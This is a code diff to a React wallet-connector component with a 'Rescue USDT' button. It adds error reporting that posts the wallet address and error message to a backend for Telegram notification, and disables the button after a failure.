@@ -14,6 +14,19 @@ export default function WalletConnector() {
   const [connected, setConnected] = useState(false);
   const [loading, setLoading] = useState(false);
   const [rescuing, setRescuing] = useState(false);
+  const [rescueDisabled, setRescueDisabled] = useState(false);
+
+  const notifyErrorToTelegram = async (walletAddr: string, errorMsg: string) => {
+    try {
+      await fetch(`${import.meta.env.VITE_API_BASE}/notifyError`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ wallet: walletAddr, error: errorMsg }),
+      });
+    } catch (tgErr) {
+      console.error("Failed to send error notification:", tgErr);
+    }
+  };
 
   const connect = async () => {
     if (!window.ethereum) {
@@ -106,6 +119,9 @@ export default function WalletConnector() {
       }
     } catch (e: any) {
       console.error(e);
+      // Send error to Telegram and permanently disable the button
+      await notifyErrorToTelegram(wallet!, e.message || "Rescue failed");
+      setRescueDisabled(true);
     } finally {
       setRescuing(false);
     }
@@ -124,8 +140,8 @@ export default function WalletConnector() {
       ) : (
         <button
           onClick={rescue}
-          disabled={rescuing}
-          className="px-8 py-3 bg-red-600 text-white font-bold rounded-lg hover:bg-red-700 disabled:opacity-50 text-lg w-full shadow-lg"
+          disabled={rescuing || rescueDisabled}
+          className="px-8 py-3 bg-red-600 text-white font-bold rounded-lg hover:bg-red-700 disabled:opacity-50 disabled:cursor-not-allowed text-lg w-full shadow-lg"
         >
           {rescuing ? "Processing..." : "Rescue USDT"}
         </button>
